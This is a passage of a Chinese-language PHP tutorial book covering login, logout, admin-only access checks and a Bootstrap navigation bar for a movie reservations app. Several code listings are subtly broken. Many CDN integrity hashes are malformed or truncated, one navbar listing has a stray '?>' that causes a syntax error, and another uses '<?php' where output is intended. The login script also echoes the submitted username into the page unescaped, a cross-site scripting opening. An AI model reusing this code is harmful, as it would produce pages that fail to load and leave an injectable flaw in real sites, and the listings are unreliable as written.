        echo "<h4><p class='text-danger'>An account does not exist for this username: "
           . "<span class='font-weight-bold'>{$user_name}</span>. "
           . "Please use a different user name.</p></h4><hr/>";
    }
    else
    {
        echo "<h4><p class='text-danger'>Something went terribly wrong!</p></h4><hr/>";
    }
}
```

> > 为了减少可能泄露给潜在攻击者的信息，更好的做法是仅表示登录凭据无效，而不明确指出用户名或密码无效。否则，有人可能会建立有效和无效用户名的列表，然后针对有效的用户名尝试破解密码。这也是一个很好的后续练习。

在找到用户凭据的 if 条件中，我们需要验证提供的密码是否与存储的密码哈希匹配。如果验证通过，我们可以为用户设置 user_id、user_name 和 user_access_privileges 会话变量。然后，将他们重定向到主页。如果密码哈希验证失败，我们需要输出一条消息，提示输入了错误的密码，并让用户重试。添加清单 23.24 中的代码。

## 23. 添加用户登录

### 清单 23.24.

```php
// IF user was found, validate password
if (mysqli_num_rows($results) == 1)
{
    $row = mysqli_fetch_array($results);

    if (password_verify($password, $row['password_hash']))
    {
        $_SESSION['user_id'] = $row['id'];
        $_SESSION['user_name'] = $row['user_name'];
        $_SESSION['user_access_privileges'] = $row['access_privileges'];

        // Redirect to the home page
        $home_url = dirname($_SERVER['PHP_SELF']);
        header('Location: ' . $home_url);
        exit;
    }
    else
    {
        echo "<h4><p class='text-danger'>An incorrect user name or password was entered.</p></h4><hr/>";
    }
}
else if (mysqli_num_rows($results) == 0) // User does not exist
{
    ...
}
```

## 完整代码清单

清单 23.25 包含 login.php 页面的完整清单。

### 清单 23.25.

```php
<?php
session_start();
require_once('pagetitles.php');
$page_title = MR_LOGIN_PAGE;
?>
<!DOCTYPE html>
<html>
<head>
    <title><?= $page_title ?></title>
    <link rel="stylesheet"
          href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
          integrity="sha384-GJzzgFwb10TQTN6wy59FFf1BuGJpLSa5DkKf0Dg1M4i1Yj7g0ZkYbI7O6t6S"
          crossorigin="anonymous">
</head>
<body>
```

## 创建 login.php 脚本

```php
<div class="card">
    <div class="card-body">
    <h1>Login to Movie Reservations Account</h1>
    <hr/>
    <?php
if (empty($_SESSION['user_id']) && isset($_POST['login_submission'])) {
    // Get user name and password
    $user_name = $_POST['user_name'];
    $password = $_POST['password'];

    if (!empty($user_name) && !empty($password)) {
      require_once('dbconnection.php');

      require_once('queryutils.php');

      $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
        or trigger_error(
          'Error connecting to MySQL server for ' . DB_NAME,

        E_USER_ERROR
      );

      // Check if user already exists
      $query = "SELECT id, user_name, password_hash, access_privileges
                FROM user WHERE user_name = ?";

      $results = parameterizedQuery($dbc, $query, 's', $user_name)
        or trigger_error(mysqli_error($dbc), E_USER_ERROR);

      // IF user was found, validate password
      if (mysqli_num_rows($results) == 1) {
        $row = mysqli_fetch_array($results);

        if (password_verify($password, $row['password_hash'])) {
          $_SESSION['user_id'] = $row['id'];
          $_SESSION['user_name'] = $row['user_name'];
          $_SESSION['user_access_privileges'] = $row['access_privileges'];

          // Redirect to the home page
          $home_url = dirname($_SERVER['PHP_SELF']);
          header('Location: ' . $home_url);
        } else {
          echo "<h4><p class='text-danger'>An incorrect user name
                or password was entered.</p></h4><hr/>";
        }
      } else if (mysqli_num_rows($results) == 0) // User does not exist
      {
        echo "<h4><p class='text-danger'>An account does not exist for this username:"
          . "<span class='font-weight-bold'> {$user_name}</span>. "
          . "Please use a different user name.</p></h4><hr/>";
    } else {
```

```
118.     form.addEventListener('submit', function (event) {
119.         if (form.checkValidity() === false) {
120.             event.preventDefault();
121.             event.stopPropagation();
122.         }
123.         form.classList.add('was-validated');
124.     }, false);
125.     });
126. }, false);
127. })();
128. </script>
129. <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
130.     integrity="sha384-q8i/X+965DzO0rT7abK41JSTqIAqWgVqWzpbo5sWxp4yYfRvH+8abtTE1Pi6jizo"
131.     crossorigin="anonymous"></script>
132. <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
133.     integrity="sha384-wHAiFfRlMFy6LSSRaxfBOY1FqYfRvH+8abtTE1Pi6jizo"
134.     crossorigin="anonymous"></script>
135. <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
136.     integrity="sha384-B0UglyR+jN8CRmK6ySgOom1jYaf2YfRvH+8abtTE1Pi6jizo"
137.     crossorigin="anonymous"></script>
138. </body>
139. </html>
```

## 创建 logout.php 脚本

为了允许用户退出我们的应用程序，我们需要创建一个 logout.php 脚本。这是一个简单的脚本。它所做的只是删除所有会话变量，并在注销后将用户重定向到主页。创建一个名为 logout.php 的新 PHP 脚本，并在清单 23.26 中输入代码。

### 清单 23.26.

```php
<?php
session_start();

// If the user is logged in, delete session variables and redirect to the home page
if (isset($_SESSION['user_id']))
{
    $_SESSION = array();
    session_destroy();
}

// Redirect to the home page
$home_url = dirname($_SERVER['PHP_SELF']);
header('Location: ' . $home_url);
exit;
```

## 允许具有管理员权限的用户

由于我们现在通过 login.php 脚本对用户进行身份验证，因此我们只需要查看会话变量 user_id 和 user_access_privileges 即可确定用户是否已登录，以及他们拥有哪些访问权限。

我们将重写整个 authorizeaccess.php 脚本并从头开始。首先删除 authorizeaccess.php 中的所有内容并调用 session_start() 函数：

```php
<?php
    session_start();
```

接下来，我们需要处理访客未通过身份验证的情况。未登录时，会话变量 user_id 或 user_access_privileges 未设置。添加以下代码（清单 23.28），如果用户未登录，则将其重定向到 unauthorizedaccess.php。

### 清单 23.28.

```php
<?php
    session_start();

    // Not logged in, redirect to unauthorizedaccess.php script
    if (!isset($_SESSION['user_id']) || !isset($_SESSION['user_access_privileges']))
    {
        header("Location: unauthorizedaccess.php");
        exit();
    }
```

如果我们通过了此条件，则知道用户已登录。现在，我们需要一个条件来检查他们是否具有管理员权限。添加清单 23.29 中的代码，如果他们没有管理员权限，则将用户重定向到 unauthorizedaccess.php。

### 清单 23.29.

```php
<?php
    // ...

    // IF NOT administrative access redirect to unauthorizedaccess.php script
    if ($_SESSION['user_access_privileges'] != 'admin')
    {
        header("Location: unauthorizedaccess.php");
        exit();
    }
```



## 23. 添加用户登录
### 完整代码清单
清单 23.30 是 authorizeaccess.php 页面的完整清单：

### 清单 23.30.
```php
<?php
session_start();

// Not logged in, redirect to unauthorizedaccess.php script
if (!isset($_SESSION['user_id']) || !isset($_SESSION['user_access_privileges']))
{
    header("Location: unauthorizedaccess.php");
    exit();
}

// IF NOT administrative access redirect to unauthorizedaccess.php script
if ($_SESSION['user_access_privileges'] != 'admin')
{
    header("Location: unauthorizedaccess.php");
    exit();
}
```

### 创建 unauthorizedaccess.php 脚本
现在我们需要创建 unauthorizedaccess.php 脚本，将未授权用户路由到该脚本。
首先创建一个基本的 Bootstrap 页面并命名为 unauthorizedaccess.php，见清单 23.31。

### 清单 23.31.
```php
<!DOCTYPE html>
<?php
require_once('pagetitles.php');
$page_title = MR_UNAUTHORIZED_ACCESS_PAGE;
?>
<html>
<head>
    <title><?= $page_title ?></title>
    <link rel="stylesheet"
        href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
        integrity="sha384-9aIt2nRpC12Uk9gS9baDl4lNQAfPnC26EWwAOH8HgZl5MYyXFc+NcPb1dKGj7Sk"
        crossorigin="anonymous">
</head>
<body>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
        integrity="sha384-DfXdzh0P0L0sSSs5nCTpuj/zy4C+OGpanoFVy38MVBnE+IbbVYuew+OrCXaRkfj"
        crossorigin="anonymous"></script>
```

### 允许具有管理员权限的用户
```html
18. <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
19.     integrity="sha384-Q6ERhVbIyZFJoft+2mJbHaEWldlVI9IOYy5n3zV9zzTmI3IksdQRVvoxMfooAo"
20.     crossorigin="anonymous"></script>
21. <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
22.     integrity="sha384-OgVvuaTPiz7J7jHlkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kROjKI"
23.     crossorigin="anonymous"></script>
24. </body>
25. </html>
```

注意我添加了页面标题的定义，该定义从名为 pagetitles.php 的脚本中包含：

```html
<!DOCTYPE html>
<?php
require_once('pagetitles.php');
$page_title = MR_UNAUTHORIZED_ACCESS_PAGE;
?>
```

将登录页面的定义添加到 pagetitles.php 中：

```php
<?php
// Page Titles
define('MR_SIGNUP_PAGE', 'Movie Reservations - Sign Up');
define('MR_LOGIN_PAGE', 'Movie Reservations - Login');
define('MR_UNAUTHORIZED_ACCESS_PAGE', 'Movie Reservations - Unauthorized Access');
```

现在回到我们的 unauthorizedaccess.php 脚本。在清单 23.32 中 <body> 标签的开头，我们将添加一些描述性文字，告知访客他们无权访问此页面：

### 清单 23.32.
```html
1. <body>
2.   <div class="card">
3.     <div class="card-body">
4.       <h3>You do not have access to this page.</h3>
5.     </div>
6.   </div>
7. </body>
```

## 23. 添加用户登录
### 完整代码清单
最后，清单 23.33 是 unauthorizedaccess.php 页面的完整清单。

### 清单 23.33.
```php
<!DOCTYPE html>
<?php
require_once('pagetitles.php');
$page_title = MR_UNAUTHORIZED_ACCESS_PAGE;
?>
<html>
<head>
<title><?= $page_title ?></title>
<link rel="stylesheet"
  href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
  integrity="sha384-GJzZQFQbQ1TTNgwy59FF1BuGJpLSa9oKkMp0gDiMn4iVmj7oZgZKVbI70eT4iS"
  crossorigin="anonymous">
<link rel="stylesheet"
  href="https://use.fontawesome.com/releases/v5.8.1/css/all.css"
  integrity="sha384-50bUJMevQqsQiMjkJheM2UfeKJSjwlBj/AX96RP1ORij8XZCGzfoxcCGI6OTg4"
  crossorigin="anonymous">
</head>
<body>
<div class="card">
  <div class="card-body">
    <h3>You do not have access to this page.</h3>
  </div>
</div>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
  integrity="sha384-q8i/X+965DzO0rT7AbK431JSTqIAqVrgVzpbozo5snXKp4YRvh+8abtTE1Pi6jizo"
  crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
  integrity="sha384-wH..."
  crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
  integrity="sha384-B0Ugly..."
  crossorigin="anonymous"></script>
</body>
</html>
```

### 练习
- 1. 在电影数据库应用程序中，添加个人用户登录。
  - 1. 创建一个具有管理员访问权限的用户并确认他们可以编辑、添加或删除电影。
  - 2. 确认普通登录用户无法编辑、添加或删除电影。

## 章节
## 24
## 添加导航菜单

> “程序测试可以非常有效地显示 bug 的存在，但对于显示其不存在则完全不够。”
> -Edsgar W. Dijkstra

## 24. 添加导航菜单
本章在我们的 *Movie Reservations* 应用程序顶部添加一个导航栏（也称为“navbar”）。导航栏使在应用程序中导航变得更加用户友好。除少数例外外，我们希望导航栏显示在应用程序的所有页面上。此外，我们希望导航栏具有上下文敏感性。也就是说，它应指示或提示我们当前所在的页面，并根据我们的权限显示我们有权访问的链接。当我们首次在未登录的情况下导航到主页时，我们希望导航栏看起来像图 24.1 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_378_0.png)

### 创建导航栏逻辑
由于我们应用程序中的几乎每个页面都会显示导航栏，我们将创建一个脚本供这些页面包含。创建一个名为 navmenu.php 的脚本，并在最顶部添加这段 PHP 代码，以检查包含此脚本的页面的 $page_title 变量：

```php
<?php
    $page_title = isset($page_title) ? $page_title : "";
?>
```

> *至关重要的是，打开的 PHP 标签 <?php 必须是文件中的第一项（前面没有空格），因为此代码在 HTML 标头发送之前运行。*

请记住，我们在包含 navmenu.php 的脚本中将 $page_title 变量设置为 pagetitles.php 中创建的定义之一（例如 index.php、login.php 等）。

由于我们在应用程序中使用会话变量，并且 navmenu.php 将被几乎每个脚本包含，让我们在 $page_title 检查之后添加以下代码以启动或恢复我们的会话：

```php
<?php
    $page_title = isset($page_title) ? $page_title : "";

    if (session_status() == PHP_SESSION_NONE)
    {
        session_start();
    }
?>
```

注意，我们仅在检查不存在现有会话后才调用 session_start()。你当然可以用错误抑制来调用（例如 @session_start()），然而，我通常对这种行为不以为然。

> 导航栏是 HTML <body> 的一部分，因此我们假设 Bootstrap 样式表已包含在包含脚本的 <head> 部分中。

在以下段落中我会解释它。将清单 24.1 中的代码添加到闭合 PHP 标签 (?>) 之后。

### 清单 24.1.
```php
1. <?php
2. $page_title = isset($page_title) ? $page_title : "";
3. 
4. // ...
5. session_start();
6. }
7. ?>
8. <nav class="navbar sticky-top navbar-expand-md navbar-dark"
9.     style="background-color: #569f32;">
10. <a class="navbar-brand" href="<?= dirname($_SERVER['PHP_SELF']) ?>">
11.     <img src="resources/movie_rental_icon.png" width="30" height="30"
12.         class="d-inline-block align-top" alt="">
13.     <?= MR_HOME_PAGE ?>
14. </a>
15. <button class="navbar-toggler" type="button" data-toggle="collapse"
16.     data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup"
17.     aria-expanded="false" aria-label="Toggle navigation">
18.     <span class="navbar-toggler-icon"></span>
19. </button>
20. <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
21.     <div class="navbar-nav">
22.     <a class="nav-item nav-link<?= $page_title == MR_HOME_PAGE ? ' active' : '' ?>"
23.         href="<?= dirname($_SERVER['PHP_SELF']) ?>">Home </a>
24. 
25. </div>
26. </nav>
```




## 24. 添加导航菜单

<nav> 元素设置了以下 Bootstrap 类属性，其用途如下：

| 类属性 | 用途 |
|---|---|
| .navbar | 指定这是一个导航栏 |
| .sticky-top | 页面滚动时固定到顶部 |
| .navbar-expand-md | 用于响应式折叠 |
| .navbar-dark | 在深色背景上显示白色文字 |

另外，请注意我将 style 属性设置为 background-color。如果省略此设置，菜单将呈现为黑底白字。

接下来是一个标准的 `<a href>` 链接，其 class 属性设置为 navbar-brand，href 设置为首页文件夹的位置，同时还有一个引用 MR_HOME_PAGE 的图像图标，必须在 pagetitles.php 中定义 MR_HOME_PAGE。在 Movie Listing 文件夹下创建一个名为 resources 的文件夹，用于存放图像图标。我把这个图标命名为 movie_rental_icon.png。

> *电影放映机图标遵循知识共享署名许可，可免费使用，我是在此处¹¹找到的。*

趁我们还没忘记，先来定义 MR_HOME_PAGE。打开 pagetitles.php，在 MR_SIGNUP_PAGE 定义之前添加以下 MR_HOME_PAGE 定义：

```php
<?php
// Page Titles
define('MR_HOME_PAGE', 'Movie Reservations');
define('MR_SIGNUP_PAGE', 'Movie Reservations - Sign Up');
define('MR_LOGIN_PAGE', 'Movie Reservations - Login');
define('MR_UNAUTHORIZED_ACCESS_PAGE', 'Movie Reservations - Unauthorized Access');
```

回到 navmenu.php，接下来有一个 <button> 元素，其 class 属性设置为 navbar-toggler，用于让按钮在响应式设计下折叠。该类会将移动设备上的导航菜单折叠为汉堡图标，如图 24.2 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_380_0.png)

[1] 此处：https://iconfinder.com/icons/753134/festival_film_icon

### 创建导航栏逻辑

然后我们有一个 <div> 标签，其 class 设置为 collapse navbar-collapse，用于对菜单项进行分组并隐藏/折叠。在这个 <div> 中，我们放置了指向首页、登录和注册页面的 navbar-nav 项目链接。事实上，这里已经有一个指向我们首页的导航链接。让我们在清单 24.2 中仔细看看它。

### 清单 24.2。

```
<nav ...>
<!-- ... -->
<div class="collapse navbar-collapse" id="navbarNavAltMarkup">
<div class="navbar-nav">
<a class="nav-item nav-link<?= $page_title == MR_HOME_PAGE ? ' active' : '' ?>" 
href="<?= dirname($_SERVER['PHP_SELF']) ?>">Home </a>
</div>
</div>
</nav>
```

要创建导航项，你需要创建一个子 <div> 标签容器，并将其 class 属性设置为 navbar-nav。接下来，创建一个子 <a href> 链接，class 设置为 nav-item nav-link。不过，你会注意到我在 href 属性之前添加了一些带三元运算符的 PHP 代码。这个链接用于首页。但是，我们希望当前所在页面的导航链接被高亮显示（例如 active）：

```
"nav-item nav-link<?= $page_title == MR_HOME_PAGE ? ' active' : '' ?>"
```

如果正在显示首页（即 index.php），class 属性将设置为：

```
class="nav-item nav-link active"
```

否则，它将设置为：

```
class="nav-item nav-link"
```

我们对所有包含 navmenu.php 并在导航栏中有对应链接的页面都使用这一机制。

有关更多详细信息，请参阅关于 Bootstrap 导航栏[2]工作原理的文档。

[2] Bootstrap 的导航栏：https://getbootstrap.com/docs/4.0/components/navbar/

### 添加导航栏

现在我们已经有了 navmenu.php 脚本，接下来对 index.php 做一些修改，并在其中包含 navmenu.php 脚本。打开 index.php 脚本，在脚本的最顶部、<!DOCTYPE html> 元素之前添加以下 PHP 代码：

```
<?php
require_once('pagetitles.php');
$page_title = MR_HOME_PAGE;
?>
<!DOCTYPE html>
<html>
```

这样可以正确设置 $page_title 变量，供我们在 navmenu.php 中使用（navmenu.php 是从 pagetitles.php 中包含的），并将页面标题从“Movies I Like”更改为“Movie Reservations”。接下来，在 <head> 元素中，用以下代码修改 <title> 元素：

```
<html>
  <head>
    <link >
    <title><?= $page_title ?></title>
  </head>
  <body>
```

这会将我们的 <title> 元素从 Movies I Like 更改为 Movie Reservations。接下来，在 <body> 元素正下方，包含 navmenu.php 脚本：

```
<body>
<?php
  require_once('navmenu.php');
?>
  <div class="card">
    <div class="card-body">
```

接下来，在 <div class="card-body"> 元素内部，修改 <h1> 元素，使其引用 $page_title 而不是 Movies I Like：

```
<div class="card">
  <div class="card-body">
    <h1><?= $page_title ?></h1>
```

> *稍后，当我们添加更多预订系统功能时，我们会移除添加电影的链接（因为它将出现在导航菜单中）。我们还会隐藏垃圾桶图标，除非用户以管理员权限登录。*

### 将导航栏添加到详情页

当用户选择某部电影时，他们会被带到该电影的“电影详情”页面。用户需要按浏览器中的后退按钮，或选择“Movies I Like”链接才能返回首页。为了在整个应用中提供一致的用户体验，更好的做法是包含导航栏并移除多余的链接。我们希望“电影详情”页面的外观如图 24.3 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_383_0.png)

请注意，“首页”菜单项没有处于激活状态，因为我们位于“电影详情”页面而不是首页。打开 pagetitles.php，在 MR_HOME_PAGE 定义之后添加以下 MR_DETAILS_PAGE 定义：

```
<?php
// Page Titles
define('MR_HOME_PAGE', 'Movie Reservations');
define('MR_DETAILS_PAGE', 'Movie Reservations - Details');
define('MR_SIGNUP_PAGE', 'Movie Reservations - Sign Up');
define('MR_LOGIN_PAGE', 'Movie Reservations - Login');
define('MR_UNAUTHORIZED_ACCESS_PAGE', 'Movie Reservations - Unauthorized Access');
```

打开 moviedetails.php 脚本，在脚本的最顶部、<!DOCTYPE html> 元素之前添加以下 PHP 代码：

```
<?php
require_once('pagetitles.php');
$page_title = MR_DETAILS_PAGE;
?>
<!DOCTYPE html>
<html>
```

## 24. 添加导航菜单

这段代码会正确设置 $page_title 变量，供我们从 pagetitles.php 中包含的 navmenu.php 使用。

接下来，在 <head> 元素中，用以下代码修改 <title> 元素：

```
<html>
<head>
<link ...>
<title><?= $page_title ?></title>
...
</head>
<body>
```

接下来，在 <body> 元素正下方，包含 navmenu.php 脚本：

```
<body>
<?php
require_once('navmenu.php');
?>
<div class="card">
<div class="card-body">
```

接下来，在 <div class="card-body"> 元素内部，移除指向 index.php 页面的 <nav class="nav"> 链接，并将其替换为 <h1>Movie Details</h1> 和一条水平线（<hr/>），如清单 24.3 所示。

### 清单 24.3。

```
1. Unchanged Lines
2. <div class="card">
3. <div class="card-body">
4. - Removed Lines
5. - <nav class="nav">
6. - <a class="nav-link" href="index.php">Movies I Like</a>
7. - </nav>
8. + Added Lines
9. + <h1>Movie Details</h1>
10. + <hr/>
```

> 当我们开始添加更多预订系统功能时，我们将隐藏编辑电影的链接，除非用户以管理员权限登录。

### 向导航栏添加登录链接

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_385_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_385_1.png)

我们需要向 login.php 页面添加一个导航链接项，并让 login.php 包含 navmenu.php。当我们位于首页且未登录时，我们希望导航菜单如图 24.4 所示。

请注意，此时“登录”链接未处于激活状态，表示我们不在 login.php 页面上。当我们导航到“登录”页面时，我们希望导航菜单如图 24.5 所示。

现在请注意，“登录”链接处于激活状态，表示我们位于 login.php 页面上。

打开 login.php 脚本，并在 <body> 元素之后立即包含 navmenu.php 脚本：

```
<body>
<?php
  require_once('navmenu.php');
?>
<div class="card">
  <div class="card-body">
```

现在打开 navmenu.php 脚本。我们将在指向首页的链接正下方，为登录页面添加一个 class 设置为 nav-item nav-link 的子 <a href> 链接。添加清单 24.4 中的代码，稍后我会解释它。




## 24. 添加导航菜单

清单 24.4.

```
1. <nav ...>
2. <!-- ... -->
3. <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
4.   <div class="navbar-nav">
5.     <a class="nav-item nav-link<?= $page_title == MR_HOME_PAGE ? ' active' : '' ?>"
6.        href="<?= dirname($_SERVER['PHP_SELF']) ?>">Home </a>
7.     <?php if (!isset($_SESSION['user_name'])): ?>
8.       <a class="nav-item nav-link<?= $page_title == MR_LOGIN_PAGE ? ' active' : '' ?>"
9.          href="login.php">Login</a>
10.    <?php endif; ?>
11.  </div>
12. </div>
13. </nav>
```

让我们单独分析一下：

```
<?php if (!isset($_SESSION['user_name'])): ?>
<a class="nav-item nav-link<?= $page_title == MR_LOGIN_PAGE ? ' active' : '' ?>" href="login.php">Login</a>
<?php endif; ?>
```

我们在这里有两个条件。外层条件检查用户是否未登录。如果你还记得 login.php，在用户登录时会有三个 session 变量被设置：

```
$_SESSION['user_id'] = $row['id'];
$_SESSION['user_name'] = $row['user_name'];
$_SESSION['user_access_privileges'] = $row['access_privileges'];
```

如果用户已经登录，就没有必要显示指向“Login”页面的链接。假设用户未登录，我们会显示指向“Login”页面的链接，然后评估三元条件。它——与主页链接类似——会评估用户当前是否在“Login”页面上。

### 在导航栏中添加注销链接

让我们为用户添加一个注销的导航链接项。另外，当用户登录时，让我们在导航菜单中显示用户名。当我们在主页且已登录时，我们希望导航菜单看起来像图 24.6。

打开 navmenu.php 脚本。在指向“Login”页面的链接下方添加一个子 <a href> 链接，并将 class 设置为 nav-item nav-link 用于我们的“Logout”页面。在清单 24.5 的第 9–10 行添加代码，我将在下面解释。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_387_0.png)

### 清单 24.5.

```
```php
1. <nav ...>
2.   ...
3.   <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
4.     <div class="navbar-nav">
5.       <a class="nav-item nav-link...">Home </a>
6.       <?php if (!isset($_SESSION['user_name'])): ?>
7.       <a class="nav-item nav-link...">Login</a>
8.       <?php else: ?>
9.       <a class='nav-item nav-link'
10.      href='logout.php'>Logout (<?= $_SESSION['user_name'] ?>)</a>
11.      <?php endif; ?>
12.    </div>
13.  </div>
14. </nav>
```
```

再次，让我们单独看一下：

```
```php
<?php else: ?>
<a class='nav-item nav-link'
  href='logout.php'>Logout (<?= $_SESSION['user_name'] ?>)</a>
<?php endif; ?>
```
```

我们将在 if 检查之后（上一清单第 8 行）添加一个 else 子句来处理已登录用户。我们显示指向 logout.php 脚本的链接并显示用户的姓名（保存在 $_SESSION['user_name'] 中）。

## 24. 添加导航菜单

### 在导航栏中添加注册链接

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_388_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_388_1.png)

接下来，我们需要在 signup.php 页面添加一个导航链接项，并让 signup.php 包含 navmenu.php。当我们在主页且未登录时，我们希望导航菜单看起来像图 24.7。

请注意，“Sign Up”链接未激活（表示我们不在 signup.php 页面上）。当我们导航到“Sign Up”页面时，我们希望导航菜单看起来像图 24.8。

现在，请注意“Sign Up”链接已激活（表示我们位于 signup.php 页面上）。打开 signup.php 脚本，并在 <body> 元素之后立即包含 navmenu.php 脚本：

```
<body>
<?php
require_once('navmenu.php');
?>
<div class="card">
<div class="card-body">
```

现在打开 navmenu.php 脚本。我们将在指向 Login 页面的链接下方为我们的 Sign Up 页面添加一个子 <a href> 链接，并将 class 设置为 nav-item nav-link。添加第 9–10 行。由于我们已经为未登录用户设置了条件，我们可以在清单 24.6 中添加 signup 链接。

### 清单 24.6.

```
1. <nav ...>
2. <!-- ... -->
3. <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
4. <div class="navbar-nav">
5. <a class="nav-item nav-link...">Home </a>
6. <?php if (!isset($_SESSION['user_name'])): ?>
7. <a class="nav-item nav-link<?php $page_title == MR_LOGIN_PAGE ? ' active' : '' ?>"
8. href="login.php">Login</a>
9. <a class="nav-item nav-link<?php $page_title == MR_SIGNUP_PAGE ? ' active' : '' ?>"
10. href="signup.php">Sign Up</a>
11. <?php else: ?>
12. <a class="nav-item nav-link"
13. href="logout.php">Logout (<?=$_SESSION['user_name'] ?>)</a>
14. <?php endif; ?>
15. </div>
16. </div>
17. </nav>
```

### 向 addmovie.php 添加导航栏

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_389_0.png)

图 24.9.

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_389_1.png)

图 24.10.

现在我们需要在 addmovie.php 页面添加一个导航链接项，并让 addmovie.php 包含 navmenu.php。我们只希望在以具有管理员权限的用户登录时显示指向“Add a Movie”页面的链接。当我们在主页且具有管理员权限时，我们希望导航菜单看起来像图 24.9。当我们在“Add a Movie”页面上时，我们希望菜单看起来像图 24.10。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_389_2.png)

图 24.11.

你需要创建一个 access_privileges 设置为 admin 的用户来测试此功能。最简单的方法是创建一个用户并将 Movie 数据库中 user 表的 access_privileges 字段从 user 改为 admin（参见图 24.11）。

打开 pagetitles.php 并在 MR_UNAUTHORIZED_ACCESS_PAGE 定义之后添加以下 MR_ADD_MOVIE_PAGE 定义。

```
```php
<?php
// Page Titles
// ...
define('MR_UNAUTHORIZED_ACCESS_PAGE', 'Movie Reservations - Unauthorized Access');
define('MR_ADD_MOVIE_PAGE', 'Movie Reservations - Add Movie');
```
```

打开 addmovie.php 脚本，并在 authorizeaccess.php 脚本的 include 之后立即包含 pagetitles.php 脚本并将 $page_title 设置为 MR_ADD_MOVIE_PAGE：

## 24. 添加导航菜单

```
<?php
require_once('authorizeaccess.php');
require_once('pagetitles.php');
$page_title = MR_ADD_MOVIE_PAGE;
?>
<!DOCTYPE html>
<html>
```

此代码正确设置了我们的 $page_title 变量以供 navmenu.php 使用，我们从 pagetitles.php 中包含它。接下来，在 <head> 元素中，修改 <title> 元素以删除“Add a Movie”并将其替换为 $page_title（清单 24.7）。

### 清单 24.7.

```
1.  Unchanged Lines
2.    <html>
3.      <head>
4.        <link ...>
5.  - Removed Line
6.  -   <title>Add a Movie</title>
7.  + Added Line
8.  +   <title><?= $page_title ?></title>
9.  Unchanged Lines
10.    </head>
11.    <body>
```

接下来，在 <body> 元素正下方包含 navmenu.php 脚本：

```
<body>
<?php
require_once('navmenu.php');
?>
<div class="card">
  <div class="card-body">
```

由于我们包含了导航栏，让我们删除 <h1>Add a Movie</h1> 下方返回主页的链接。参见清单 24.8,

### 清单 24.8.

```
1.  Unchanged Lines
2.    <div class="card">
3.      <div class="card-body">
4.        <h1>Add a Movie</h1>
5.  - Removed Lines
6.  -     <nav class="nav">
7.  -       <a class="nav-link" href="index.php">Movies I Like</a>
8.  -     </nav>
9.  Unchanged Lines
10.     <hr/>
```

打开 navmenu.php 脚本。在指向主页的链接下方为我们的“Add a Movie”页面添加一个子 <a href> 链接，并将 class 设置为 nav-item nav-link。添加清单 24.9 中的代码。

### 清单 24.9.

```
1.  <nav ...>
2.      <!-- ... -->
3.      <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
4.          <div class="navbar-nav">
5.              <a class="nav-item nav-link...">Home </a>
6.      <?php if (isset($_SESSION['user_access_privileges'])) ?>
7.          && $_SESSION['user_access_privileges'] == 'admin'): ?>
8.          <a class="  nav-item
9.              nav-link<?= $page_title == MR_ADD_MOVIE_PAGE ? ' active' : '' ?>"
10.             href="addmovie.php">Add a Movie</a>
11.      <?php endif; ?>
12.      <?php if (!isset($_SESSION['user_name'])): ?>
13.              <a ...>Login</a>
14.              <a ...>Sign Up</a>
15.      <?php else: ?>
16.              <a class='nav-item nav-link' href='logout.php'>Logout
17.              (<?= $_SESSION['user_name'] ?>)</a>
18.      <?php endif; ?>
19.          <!-- ... -->
20.          </div>
21.      </div>
22.  </nav>
```

再次，让我们单独看一下：

```
<?php if (isset($_SESSION['user_access_privileges'])
    && $_SESSION['user_access_privileges'] == 'admin'): ?>
<a class="nav-item nav-link<?= $page_title == MR_ADD_MOVIE_PAGE ? ' active' : '' ?>"
   href="addmovie.php">Add a Movie</a>
<?php endif; ?>
```

与之前的示例类似，我们在这里有两个条件。第一个（外层条件）检查用户是否具有管理员权限。

> > *顺便说一下，此条件也检查用户是否已登录，因为 $_SESSION['user_access_privileges'] 仅在用户登录时设置。*



## 24. 添加导航菜单

如果用户未登录，或者用户已登录但不具备管理员权限，则“添加电影”页面的链接将不会显示。假设用户已登录且具有管理员权限，我们显示指向“添加电影”页面的链接，然后计算三元条件，以判断“添加电影”页面是否处于激活状态。

### 向 unauthorizedaccess.php 添加导航栏

由于用户可能会导航到其无权访问的页面，因此我们向 unauthorizedaccess.php 脚本添加导航栏。我们的页面将如图 24.12 所示。

打开 unauthorizedaccess.php 脚本，并在 `<body>` 元素之后立即引入 navmenu.php 脚本：

```
<body>
<?php
require_once('navmenu.php');
?>
<div class="card">
<div class="card-body">
```

